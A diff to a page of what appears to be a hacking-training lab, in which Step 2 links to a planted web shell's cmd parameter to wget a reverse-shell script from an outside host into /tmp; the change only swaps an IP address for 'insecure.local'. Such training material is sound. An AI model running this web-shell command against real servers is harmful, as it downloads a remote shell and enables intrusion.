@@ -36,7 +36,7 @@
             <div class="steps">
                 <h2>Step 2</h2>
     		    <h4> Use the newly created script to download a reverse shell</h4>
-    		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
+    		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://insecure.local/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://insecure.local/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
             </div>
             <nav>
                 <a href="step3.php">Goto step 3</a>
